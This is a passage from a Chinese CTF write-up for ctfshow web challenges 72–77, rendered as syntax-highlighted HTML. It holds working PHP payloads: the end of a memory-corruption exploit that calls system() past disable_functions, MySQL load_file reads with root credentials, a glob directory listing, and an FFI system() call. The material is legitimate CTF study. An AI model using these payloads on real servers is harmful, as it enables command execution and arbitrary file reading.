double-quoted-string\">\"Couldn't determine binary base address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$elf</span> <span class=\"token operator\">=</span> <span class=\"token function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't parse ELF header\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get basic_functions address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$zif_system</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get zif_system address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x110</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_obj</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$fake_obj_offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$zif_system</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\n    <span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag0.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>原理我不懂我讲不明白</p>\n<pre><code>https://blog.csdn.net/weixin_46081055/article/details/121648027?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165104069916781435457811%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165104069916781435457811&amp;biz_id=0\n</code></pre>\n<h2><a id=\"Web73_1185\"></a>Web73</h2>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\f95605eafba745c4917af1fb256da5c7.png\"/><br/> 用72题的方法遍历目录，可以知道flag在flagc.txt文件中，试一下能不能直接读取<br/> <img alt=\"image-20220502003014272\" src=\"image\\e083e6e66c857c3307ee2b6b3103f374.png\"/></p>\n<p>还得强制结束<br/> <img alt=\"在这里插入图片描述\" src=\"image\\ad7b8a5ff37a4ceea18b9eeda03204f3.png\"/></p>\n<p>得到flag</p>\n<h2><a id=\"Web74_1198\"></a>Web74</h2>\n<p>和73一样，文件名被改为flagx.php</p>\n<h2><a id=\"Web75_1206\"></a>Web75</h2>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">try</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mysql:host=localhost;dbname=ctftraining'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dbh</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select load_file(\"/flag36.txt\")'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">PDOException</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token keyword\">echo</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"Web76_1212\"></a>Web76</h2>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">try</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mysql:host=localhost;dbname=ctftraining'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$dbh</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select load_file(\"/flag36d.txt\")'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">PDOException</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token keyword\">echo</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>这两题用了数据库？？？我没弄明白，把payload先放下了</p>\n<h2><a id=\"Web77_1226\"></a>Web77</h2>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">php</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这里涉及FFI（我不会我不会）</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token variable\">$ffi</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">FFI</span><span class=\"token operator\">::</span><span class=\"token function\">cdef</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"int system(const char *command);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/readflag &gt; 1.txt'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ffi</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>之后直接访问1.txt</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}